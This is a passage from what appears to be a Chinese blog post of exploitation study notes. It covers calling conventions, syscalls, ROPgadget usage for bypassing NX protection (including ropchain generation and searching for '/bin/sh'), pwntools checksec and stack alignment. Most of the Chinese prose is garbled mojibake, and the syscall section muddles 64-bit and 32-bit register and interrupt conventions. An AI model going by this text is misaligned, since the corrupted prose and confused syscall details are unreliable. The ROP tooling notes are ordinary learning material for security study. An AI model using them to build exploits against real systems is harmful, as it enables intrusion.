</span><br><span class="line">00B618FE  mov         edx,dword ptr [a]  </span><br><span class="line">00B61901  push        edx  </span><br><span class="line">00B61902  mov         edx,dword ptr [b]  </span><br><span class="line">00B61905  mov         ecx,dword ptr [a]  </span><br><span class="line">00B61908  call        @func3@56 (0B613C0h)  </span><br><span class="line">00B6190D  nop  </span><br></pre></td></tr></table></figure><p>å‚æ•°å…ˆä»å³è‡³å·¦ä¾æ¬¡å‹æ ˆï¼Œç„¶åæœ€å·¦ä¾§ä¸¤ä¸ªå‚æ•°åˆ†åˆ«å­˜åœ¨ecxå’Œedx<br>åœ¨x64ä¸‹ï¼Œä¾ç„¶æ˜¯ä»å³è‡³å·¦ä¾æ¬¡å‹æ ˆï¼Œæœ€å·¦ä¾§4ä¸ªå‚æ•°åˆ†åˆ«å­˜åœ¨rcxï¼Œrdxï¼Œr8ï¼Œr9å¯„å­˜å™¨ä¸­</p><p>linuxä¸‹ï¼š</p><p>åˆ†åˆ«ä¸ºrdi,rsi,rdx,rcx,r8,r9</p><h4 id="è¡¥å……">è¡¥å……</h4><p>åœ¨<a href="https://blog.csdn.net/a3192048/article/details/82084374">è°ƒç”¨çº¦å®š__cdeclã€__stdcallå’Œ__fastcallçš„åŒºåˆ«_win call stdcall-CSDNåšå®¢</a>è¿™ç¯‡ä¸Šçœ‹åˆ°äº†è¿™äº›è¯´æ³•ï¼š</p><blockquote><h2 id="cdeclçš„ç‰¹ç‚¹">__cdeclçš„ç‰¹ç‚¹</h2><p>__cdecl æ˜¯ C Declaration çš„ç¼©å†™ï¼Œè¡¨ç¤º C å’Œ C++ é»˜è®¤çš„å‡½æ•°è°ƒç”¨çº¦å®šã€‚æ˜¯C/C++å’ŒMFCXçš„é»˜è®¤è°ƒç”¨çº¦å®šã€‚</p><ul><li>æŒ‰ä»å³è‡³å·¦çš„é¡ºåºå‹å‚æ•°å…¥æ ˆã€ã€‚</li><li>ç”±è°ƒç”¨è€…æŠŠå‚æ•°å¼¹å‡ºæ ˆã€‚åˆ‡è®°ï¼šå¯¹äºä¼ é€å‚æ•°çš„å†…å­˜æ ˆæ˜¯ç”±è°ƒç”¨è€…æ¥ç»´æŠ¤çš„ï¼Œè¿”å›å€¼åœ¨EAXä¸­ã€‚å› æ­¤å¯¹äºåƒprintfè¿™æ ·å¯å˜å‚æ•°çš„å‡½æ•°å¿…é¡»ç”¨è¿™ç§çº¦å®šã€‚</li><li>ç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™å¯¹è¿™ç§è°ƒç”¨è§„åˆ™çš„å‡½æ•°ç”Ÿæˆä¿®é¥°åçš„æ—¶å€™ï¼Œåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œæ ¼å¼ä¸º_functionã€‚å¦‚å‡½æ•°int add(int a, int b)çš„ä¿®é¥°åæ˜¯_addã€‚</li></ul><p>(1).ä¸ºäº†éªŒè¯å‚æ•°æ˜¯ä»å³è‡³å·¦çš„é¡ºåºå‹æ ˆçš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸‹é¢è¿™æ®µä»£ç ï¼ŒDebugè¿›è¡Œå•æ­¥è°ƒè¯•,å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è°ƒç”¨æ ˆä¼šå…ˆè¿›å…¥GetC()ï¼Œå†è¿›å…¥GetB()ï¼Œæœ€åè¿›å…¥GetA()ã€‚</p><p>(2).ç¬¬äºŒç‚¹â€œè°ƒç”¨è€…æŠŠå‚æ•°å¼¹å‡ºæ ˆâ€ï¼Œè¿™æ˜¯ç¼–è¯‘å™¨çš„å·¥ä½œï¼Œæš‚æ—¶æ²¡åŠæ³•éªŒè¯ã€‚è¦æ·±å…¥äº†è§£è¿™éƒ¨åˆ†ï¼Œéœ€è¦å­¦ä¹ æ±‡ç¼–è¯­è¨€ç›¸å…³çš„çŸ¥è¯†ã€‚</p><p>(3).å‡½æ•°çš„ä¿®é¥°åï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡å¯¹ç¼–è¯‘å‡ºçš„dllä½¿ç”¨VSçš„â€dumpbin /exports <em>ProjectName</em>.dllâ€å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹(åé¢ç« èŠ‚ä¼šè¿›è¡Œè¯¦ç»†ä»‹ç»)ï¼Œæˆ–ç›´æ¥æ‰“å¼€.objæ–‡ä»¶æŸ¥æ‰¾å¯¹åº”çš„æ–¹æ³•å(å¦‚æœç´¢add)ã€‚</p><p>ä»ä»£ç å’Œç¨‹åºè°ƒè¯•çš„å±‚é¢è€ƒè™‘ï¼Œå‚æ•°çš„å‹æ ˆé¡ºåºå’Œæ ˆçš„æ¸…ç†æˆ‘ä»¬éƒ½ä¸ç”¨å¤ªè§‚æ³¨ï¼Œå› ä¸ºè¿™æ˜¯ç¼–è¯‘å™¨çš„å†³å®šçš„ï¼Œæˆ‘ä»¬æ”¹å˜ä¸äº†ã€‚ä½†ç¬¬ä¸‰ç‚¹å´å¸¸å¸¸å›°æ‰°æˆ‘ä»¬ï¼Œå› ä¸ºå¦‚æœä¸å¼„æ¸…æ¥šè¿™ç‚¹ï¼Œåœ¨å¤šä¸ªåº“ä¹‹é—´(å¦‚dllã€libã€exe)ç›¸äº’è°ƒç”¨ã€ä¾èµ–æ—¶å¸¸å¸¸å‡ºå‡ºç°è«åå…¶å¦™çš„é”™è¯¯ã€‚</p></blockquote><blockquote><h2 id="stdcallçš„ç‰¹ç‚¹">__stdcallçš„ç‰¹ç‚¹</h2><p>__stdcallæ˜¯Standard Callçš„ç¼©å†™ï¼Œæ˜¯C++çš„æ ‡å‡†è°ƒç”¨æ–¹å¼,å½“ç„¶è¿™æ˜¯å¾®è½¯å®šä¹‰çš„æ ‡å‡†ï¼Œ__stdcallé€šå¸¸ç”¨äºWin32 APIä¸­(å¯æŸ¥çœ‹WINAPIçš„å®šä¹‰)ã€‚  <strong>microsoftçš„vcé»˜è®¤çš„æ˜¯__cdeclæ–¹å¼ï¼Œè€Œwindows APIåˆ™æ˜¯__stdcallï¼Œå¦‚æœç”¨vcå¼€å‘dllç»™å…¶ä»–è¯­è¨€ç”¨ï¼Œåˆ™åº”è¯¥æŒ‡å®š__stdcallæ–¹å¼ã€‚å †æ ˆç”±è°æ¸…é™¤è¿™ä¸ªå¾ˆé‡è¦ï¼Œå¦‚æœæ˜¯è¦å†™æ±‡ç¼–å‡½æ•°ç»™Cè°ƒç”¨ï¼Œä¸€å®šè¦å°å¿ƒå †æ ˆçš„æ¸…é™¤å·¥ä½œï¼Œå¦‚æœæ˜¯__cdeclæ–¹å¼çš„å‡½æ•°ï¼Œåˆ™å‡½æ•°æœ¬èº«ï¼ˆå¦‚æœä¸ç”¨æ±‡ç¼–å†™ï¼‰åˆ™ä¸éœ€è¦å…³å¿ƒä¿å­˜å‚æ•°çš„å †æ ˆçš„æ¸…é™¤ï¼Œä½†æ˜¯å¦‚æœæ˜¯__stdcallçš„è§„åˆ™ï¼Œä¸€å®šè¦åœ¨å‡½æ•°é€€å‡º(ret)å‰æ¢å¤å †æ ˆã€‚</strong></p><ul><li>æŒ‰ä»å³è‡³å·¦çš„é¡ºåºå‹å‚æ•°å…¥æ ˆã€‚</li><li>ç”±è¢«è°ƒç”¨è€…æŠŠå‚æ•°å¼¹å‡ºæ ˆã€‚åˆ‡è®°ï¼šå‡½æ•°è‡ªå·±åœ¨é€€å‡ºæ—¶æ¸…ç©ºå †æ ˆï¼Œè¿”å›å€¼åœ¨EAXä¸­ã€‚</li><li>__stdcallè°ƒç”¨çº¦å®šåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œåé¢åŠ ä¸Šä¸€ä¸ªâ€œ@â€ç¬¦å·å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œæ ¼å¼ä¸º_function@numberã€‚å¦‚å‡½æ•°int sub(int a, int b)çš„ä¿®é¥°åæ˜¯_sub@8ã€‚</li></ul></blockquote><blockquote><h2 id="fastcallçš„ç‰¹ç‚¹">__fastcallçš„ç‰¹ç‚¹</h2><p>__fastcallè°ƒç”¨çš„ä¸»è¦ç‰¹ç‚¹å°±æ˜¯å¿«ï¼Œå› ä¸ºå®ƒæ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ é€å‚æ•°çš„ã€‚</p><ul><li>å®é™…ä¸Š__fastcallç”¨ECXå’ŒEDXä¼ é€å‰ä¸¤ä¸ªDWORDæˆ–æ›´å°çš„å‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»è‡ªå³å‘å·¦å‹æ ˆä¼ é€ï¼Œè¢«è°ƒç”¨çš„å‡½æ•°åœ¨è¿”å›å‰æ¸…ç†ä¼ é€å‚æ•°çš„å†…å­˜æ ˆã€‚</li><li>__fastcallè°ƒç”¨çº¦å®šåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªâ€œ@â€ç¬¦å·ï¼Œåé¢ä¹Ÿæ˜¯ä¸€ä¸ªâ€œ@â€ç¬¦å·å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œæ ¼å¼ä¸º@function@number,å¦‚double multi(double a, double b)çš„ä¿®é¥°åæ˜¯@multi@16ã€‚</li><li>__fastcallå’Œ__stdcallå¾ˆè±¡ï¼Œå”¯ä¸€å·®åˆ«å°±æ˜¯å¤´ä¸¤ä¸ªå‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€ã€‚æ³¨æ„é€šè¿‡å¯„å­˜å™¨ä¼ é€çš„ä¸¤ä¸ªå‚æ•°æ˜¯ä»å·¦å‘å³çš„ï¼Œå³ç¬¬1ä¸ªå‚æ•°è¿›ECXï¼Œç¬¬2ä¸ªè¿›EDXï¼Œå…¶ä»–å‚æ•°æ˜¯ä»å³å‘å·¦çš„å…¥æ ˆï¼Œè¿”å›ä»ç„¶é€šè¿‡EAXã€‚</li></ul></blockquote><blockquote><h2 id="thiscall">__thiscall</h2><p>__thiscallæ˜¯C++ç±»æˆå‘˜å‡½æ•°ç¼ºçœçš„è°ƒç”¨çº¦å®šï¼Œä½†å®ƒæ²¡æœ‰æ˜¾ç¤ºçš„å£°æ˜å½¢å¼ã€‚å› ä¸ºåœ¨C++ç±»ä¸­ï¼Œæˆå‘˜å‡½æ•°è°ƒç”¨è¿˜æœ‰ä¸€ä¸ªthisæŒ‡é’ˆå‚æ•°ï¼Œå› æ­¤å¿…é¡»ç‰¹æ®Šå¤„ç†ï¼Œthiscallè°ƒç”¨çº¦å®šçš„ç‰¹ç‚¹ï¼š</p><ul><li>å‚æ•°å…¥æ ˆï¼šå‚æ•°ä»å³å‘å·¦å…¥æ ˆ</li><li>thisæŒ‡é’ˆå…¥æ ˆï¼šå¦‚æœå‚æ•°ä¸ªæ•°ç¡®å®šï¼ŒthisæŒ‡é’ˆé€šè¿‡ecxä¼ é€’ç»™è¢«è°ƒç”¨è€…ï¼›å¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼ŒthisæŒ‡é’ˆåœ¨æ‰€æœ‰å‚æ•°å‹æ ˆåè¢«å‹å…¥æ ˆã€‚</li><li>æ ˆæ¢å¤ï¼šå¯¹å‚æ•°ä¸ªæ•°ä¸å®šçš„ï¼Œè°ƒç”¨è€…æ¸…ç†æ ˆï¼Œå¦åˆ™å‡½æ•°è‡ªå·±æ¸…ç†æ ˆã€‚</li></ul></blockquote><h3 id="SYSCALL">SYSCALL</h3><p>ç³»ç»Ÿè°ƒç”¨æ˜¯ç”¨æˆ·å±‚è°ƒç”¨å†…æ ¸å±‚å‡½æ•°çš„æ¥å£<br>ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨éœ€è¦éµå¾ªä¸€å®šæ ¼å¼ã€‚</p><p>å†…æ ¸ä¸­æœ‰ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œæ˜¯å†…æ ¸å‡½æ•°çš„æŒ‡é’ˆæ•°ç»„ã€‚å¯¹åº”å‡½æ•°åœ¨æ•°ç»„ä¸­çš„ä¸‹æ ‡ä¸ºç³»ç»Ÿè°ƒç”¨å·ã€‚ä½¿ç”¨SYSCALLæ—¶</p><p>raxå¯„å­˜å™¨ä¸­å­˜æ”¾è°ƒç”¨å·ï¼Œå‚æ•°æ”¾åœ¨ï¼šebxï¼Œecxï¼Œedxï¼Œesiï¼Œedi</p><p>windowsä¸Šè§¦å‘ä¸ºint 2E;Linuxä¸Šä¸ºint 80;</p><p>å°è¯•åœ¨windowsä¸Šè°ƒç”¨ï¼Œå¤±è´¥ã€‚</p><h2 id="ROPgadget">ROPgadget</h2><p>é€šè¿‡ROPå³é¢å‘è¿”å›çš„ç¼–ç¨‹å¯ä»¥å®ç°å¯¹NXä¿æŠ¤çš„ç»•è¿‡ã€‚ROPgadgetæ˜¯ä¸€ä¸ªç”¨æ¥å¯»æ‰¾gadgetsçš„å·¥å…·</p><p>å®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">sudo python setup.py install</span><br><span class="line">ROPgadget --help</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ç¨‹åºåç§° | grep &quot;æ±‡ç¼–æŒ‡ä»¤&quot;</span><br></pre></td></tr></table></figure><p>å¦‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary æ–‡ä»¶å | grep rdi</span><br></pre></td></tr></table></figure><p>è·å¾—æ‰€æœ‰å’Œrdiæœ‰å…³çš„æŒ‡ä»¤åœ°å€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary æ–‡ä»¶å --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><p>è·å¾—æ‰€æœ‰å’Œpopæˆ–è€…retrdiæœ‰å…³çš„åœ°å€</p><p><a href="https://leeyuxun.github.io/ROPgadget%E4%BB%8B%E7%BB%8D.html#:~:text=ROPgadget">ROPgadget ä»‹ç» | Leeyuxun ã® note</a><br>è¿™ç¯‡å¾ˆä¸é”™ï¼Œæ€•ä¸¢äº†ï¼Œå¤åˆ¶ä¸€ä¸‹ï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget <span class="comment">[-h]</span> <span class="comment">[-v]</span> <span class="comment">[-c]</span> <span class="comment">[--binary &lt;binary&gt;]</span> <span class="comment">[--opcode &lt;opcodes&gt;]</span></span><br><span class="line">                 <span class="comment">[--string &lt;string&gt;]</span> <span class="comment">[--memstr &lt;string&gt;]</span> <span class="comment">[--depth &lt;nbyte&gt;]</span></span><br><span class="line">                 <span class="comment">[--only &lt;key&gt;]</span> <span class="comment">[--filter &lt;key&gt;]</span> <span class="comment">[--range &lt;start-end&gt;]</span></span><br><span class="line">                 <span class="comment">[--badbytes &lt;byte&gt;]</span> <span class="comment">[--rawArch &lt;arch&gt;]</span> <span class="comment">[--rawMode &lt;mode&gt;]</span></span><br><span class="line">                 <span class="comment">[--rawEndian &lt;endian&gt;]</span> <span class="comment">[--re &lt;re&gt;]</span> <span class="comment">[--offset &lt;hexaddr&gt;]</span></span><br><span class="line">                 <span class="comment">[--ropchain]</span> <span class="comment">[--thumb]</span> <span class="comment">[--console]</span> <span class="comment">[--norop]</span> <span class="comment">[--nojop]</span></span><br><span class="line">                 <span class="comment">[--callPreceded]</span> <span class="comment">[--nosys]</span> <span class="comment">[--multibr]</span> <span class="comment">[--all]</span> <span class="comment">[--noinstr]</span></span><br><span class="line">                 <span class="comment">[--dump]</span> <span class="comment">[--silent]</span> <span class="comment">[--align ALIGN]</span> <span class="comment">[--mipsrop &lt;rtype&gt;]</span></span><br></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-h, <span class="comment">--help           æ˜¾ç¤ºå¸®åŠ©æ–‡æ¡£</span></span><br><span class="line">-v, <span class="comment">--version        ç‰ˆæœ¬å·</span></span><br><span class="line">-c, <span class="comment">--checkUpdate    æ£€æµ‹æ–°ç‰ˆæœ¬æ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="comment">--binary &lt;binary&gt;    æŒ‡å®šäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ†æ</span></span><br><span class="line"><span class="comment">--opcode &lt;opcodes&gt;   åœ¨å¯æ‰§è¡Œæ®µä¸­æŸ¥æ‰¾opcode</span></span><br><span class="line"><span class="comment">--string &lt;string&gt;    åœ¨å¯è¯»çš„æ®µä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">--memstr &lt;string&gt;    æŸ¥æ‰¾å•ä¸ªbyteåœ¨æ‰€æœ‰çš„å¯æ‰§è¡Œæ®µä¸­</span></span><br><span class="line"><span class="comment">--depth &lt;nbyte&gt;      æœç´¢å¼•æ“çš„æ·±åº¦(é»˜è®¤10)</span></span><br><span class="line"><span class="comment">--only &lt;key&gt;         åªæ˜¾ç¤ºç‰¹åˆ«çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment">--filter &lt;key&gt;       è¿‡æ»¤ç‰¹å®šæŒ‡ä»¤</span></span><br><span class="line"><span class="comment">--range &lt;start-end&gt;  åœ¨åœ°å€ä¹‹é—´å¯»æ‰¾(0x...-0x...)</span></span><br><span class="line"><span class="comment">--badbytes &lt;byte&gt;    æ‹’ç»ç‰¹å®šæŒ‡ä»¤åœ¨gadgetçš„åœ°å€ä¸‹</span></span><br><span class="line"><span class="comment">--rawArch &lt;arch&gt;     æŒ‡å®šæ–‡ä»¶æ¶æ„: x86|arm|arm64|sparc|mips|ppc</span></span><br><span class="line"><span class="comment">--rawMode &lt;mode&gt;     æŒ‡å®šæºæ–‡ä»¶çš„mode: 32|64|arm|thumb</span></span><br><span class="line"><span class="comment">--rawEndian &lt;endian&gt; æŒ‡å®šæºæ–‡ä»¶çš„å­—èŠ‚é¡ºåº: little|big</span></span><br><span class="line"><span class="comment">--re &lt;re&gt;            æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="comment">--offset &lt;hexaddr&gt;   æŒ‡å®šgadgetçš„åœ°å€åç§»</span></span><br><span class="line"><span class="comment">--ropchain           ROPé“¾çš„ç”Ÿæˆ</span></span><br><span class="line"><span class="comment">--thumb              åœ¨ARMæ¶æ„ä¸‹ä½¿ç”¨æœç´¢å¼•æ“thumb æ¨¡å¼</span></span><br><span class="line"><span class="comment">--console            ä½¿ç”¨äº¤äº’ç»ˆç«¯å¯¹äºæœç´¢å¼•æ“</span></span><br><span class="line"><span class="comment">--norop              ç¦æ­¢ROPæœç´¢å¼•æ“</span></span><br><span class="line"><span class="comment">--nojop              ç¦æ­¢JOPæœç´¢å¼•æ“</span></span><br><span class="line"><span class="comment">--callPreceded       ä»…æ˜¾ç¤ºcall-precededçš„gadgets</span></span><br><span class="line"><span class="comment">--nosys              ç¦æ­¢SYSæœç´¢å¼•æ“</span></span><br><span class="line"><span class="comment">--multibr            å…è®¸å¤šåˆ†ægadgets</span></span><br><span class="line"><span class="comment">--all                ç¦æ­¢åˆ é™¤é‡å¤çš„gadgetsï¼Œå³æ˜¾ç¤ºæ‰€æœ‰</span></span><br><span class="line"><span class="comment">--noinstr            ç¦æ­¢gadgetæŒ‡ä»¤ç»ˆç«¯æ‰“å°</span></span><br><span class="line"><span class="comment">--dump               è¾“å‡ºgadget bytes</span></span><br><span class="line"><span class="comment">--align ALIGN        å¯¹é½gadgetåœ°å€ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</span></span><br><span class="line"><span class="comment">--mipsrop &lt;rtype&gt;    MIPSjæ¶æ„ä¸‹æœ‰ç”¨çš„gadgetæŸ¥æ‰¾å™¨: stackfinder|system|tails|lia0|registers</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--ropchain</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--depth</span> <span class="number">3</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--string</span> <span class="string">&quot;main&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--string</span> <span class="string">&quot;m..n&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--opcode</span> c9c3</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--only</span> <span class="string">&quot;mov|ret&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--only</span> <span class="string">&quot;mov|pop|xor|ret&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--filter</span> <span class="string">&quot;xchg|add|sub|cmov.*&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--norop</span> <span class="attr">--nosys</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--range</span> <span class="number">0</span>x08041000-<span class="number">0</span>x08042000</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--string</span> <span class="selector-tag">main</span> <span class="attr">--range</span> <span class="number">0</span>x080c9aaa-<span class="number">0</span>x080c9aba</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--memstr</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--console</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--badbytes</span> <span class="string">&quot;00|01-1f|7f|42&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/Linux_lib64<span class="selector-class">.so</span> <span class="attr">--offset</span> <span class="number">0</span>xdeadbeef00000000</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-ARMv7-ls <span class="attr">--depth</span> <span class="number">5</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-ARM64-bash <span class="attr">--depth</span> <span class="number">5</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/raw-x86<span class="selector-class">.raw</span> <span class="attr">--rawArch</span>=x86 <span class="attr">--rawMode</span>=<span class="number">32</span></span><br></pre></td></tr></table></figure><h2 id="checksec">checksec</h2><p>pwntoolä¸­ç”¨æ¥æ£€æŸ¥ç¨‹åºå¼€å¯äº†ä»€ä¹ˆä¿æŠ¤çš„æŒ‡ä»¤</p><p>ç›´æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e = ELF(â€œxxxâ€)</span><br><span class="line">e.checksec()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><h2 id="æ ˆçš„å­—èŠ‚å¯¹é½">æ ˆçš„å­—èŠ‚å¯¹é½</h2><p>è¿™é‡Œæœ‰ä¸€ç¯‡å†™çš„å¾ˆå¥½<br><a href="https://www.cnblogs.com/tcctw/p/11333743.html#:~:text=%E6%97%A0%E8%AE%BA%E6%95%B0%E6%8D%AE%E6%98%AF%E5%90%A6%E5%AF%B9%E9%BD%90%EF%BC%8Cx">x86_64 Linux è¿è¡Œæ—¶æ ˆçš„å­—èŠ‚å¯¹é½ - ä¸€å·official - åšå®¢å›­ (cnblogs.com)</a></p><blockquote><p>æ ˆçš„å­—èŠ‚å¯¹é½ï¼Œå®é™…æ˜¯æŒ‡æ ˆé¡¶æŒ‡é’ˆå¿…é¡»æ˜¯16å­—èŠ‚çš„æ•´æ•°å€ã€‚æ ˆå¯¹é½ä½¿å¾—åœ¨å°½å¯èƒ½å°‘çš„å†…å­˜è®¿é—®å‘¨æœŸå†…è¯»å–æ•°æ®ï¼Œä¸å¯¹é½å †æ ˆæŒ‡é’ˆå¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ€§èƒ½ä¸‹é™ã€‚</p><p>ä¸Šæ–‡æˆ‘ä»¬è¯´ï¼Œå³ä½¿æ•°æ®æ²¡æœ‰å¯¹é½ï¼Œæˆ‘ä»¬çš„ç¨‹åºä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œåªæ˜¯æ•ˆç‡æœ‰ç‚¹ä½è€Œå·²ï¼Œä½†æ˜¯æŸäº›å‹å·çš„Intelå’ŒAMDå¤„ç†å™¨ï¼Œåœ¨æ‰§è¡ŒæŸäº›å®ç°å¤šåª’ä½“æ“ä½œçš„SSEæŒ‡ä»¤æ—¶ï¼Œå¦‚æœæ•°æ®æ²¡æœ‰å¯¹é½ï¼Œå°†æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚è¿™äº›æŒ‡ä»¤å¯¹16å­—èŠ‚å†…å­˜è¿›è¡Œæ“ä½œï¼Œåœ¨SSEå•å…ƒå’Œå†…å­˜ä¹‹é—´ä¼ é€æ•°æ®çš„æŒ‡ä»¤è¦æ±‚å†…å­˜åœ°å€å¿…é¡»æ˜¯16çš„å€æ•°ã€‚</p><p>å› æ­¤ï¼Œä»»ä½•é’ˆå¯¹x86_64å¤„ç†å™¨çš„ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶ç³»ç»Ÿéƒ½å¿…é¡»ä¿è¯ï¼Œ å®ƒä»¬åˆ†é…å†…å­˜å°†æ¥å¯èƒ½ä¼šè¢«SSEæŒ‡ä»¤ä½¿ç”¨ï¼Œæ‰€ä»¥å¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ï¼Œè¿™ä¹Ÿå°±å½¢æˆäº†ä¸€ç§æ ‡å‡†ï¼š</p><ul><li>ä»»ä½•å†…å­˜åˆ†é…å‡½æ•°ï¼ˆ<code>alloca</code>, <code>malloc</code>, 